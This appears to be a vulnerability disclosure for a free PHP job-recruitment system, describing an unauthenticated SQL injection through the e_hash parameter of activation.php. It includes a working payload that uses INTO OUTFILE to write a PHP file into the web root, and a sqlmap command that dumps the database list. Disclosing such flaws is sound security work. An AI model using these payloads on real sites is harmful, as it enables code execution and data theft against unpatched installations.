# Job-recruitment-in-php has write Trojan and sql injection vulnerability via activation.php.

## supplier
https://code-projects.org/job-recruitment-in-php-css-javascript-and-mysql-free-download/
## Vulnerability file
activation.php
## describe
Through code audit, when there is an unauthorized SQL injection vulnerability in the activation.php of the Job_Recruitment systtem foreground login portal, all the information of the database can be obtained without authorization, and arbitrary commands may be executed.

control parameter: **$e_hash**=$_GET['e_hash']

## code analysis
The **$e_hash** parameters of the activation.php are not filtered and concatenated into the SQL statement for execution. 

![image-20241110153050504](https://github.com/user-attachments/assets/493b8c4c-34ba-456d-86f9-29fc0d201838)

## POC

### RCE

```
http://airecruitmentsystem/activation.php?id=10&e=123456&p=1&e_hash=1' union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,'<?php phpinfo();?>' into outfile 'D:/phpstudy_pro/WWW/ai-recruitment-system-master/shell.php'--+
```

The Trojan file is generated shell.php in the root directory of the website, we access the phpinfo.php file through the browser, we can see that 1,2,3,4,5,6,7,8,9,10,11,12,13,14,'<?php phpinfo();?>' are all generated into the file, and the access is resolved

asset the url: shell.php

```
http://airecruitmentsystem/shell.php
```

![image-20241110215052426](https://github.com/user-attachments/assets/b1b6e915-e008-4812-a0e8-f37672bea65f)

### GET DATA

excute the sqlmap command.

```
 python sqlmap.py -u "http://airecruitmentsystem/activation.php?id=10&e=123456&p=1&e_hash=1*" --dbs
```

get dbs: owlphin...

![image-20241110215358910](https://github.com/user-attachments/assets/50bafe8b-d1b6-4060-9706-cb4e65a3168a)

![image-20241110215520563](https://github.com/user-attachments/assets/12c426e5-16f0-43f4-bd62-1d3c505c2148)

**Discover**

西安电子科技大学 李腾，谢亚轩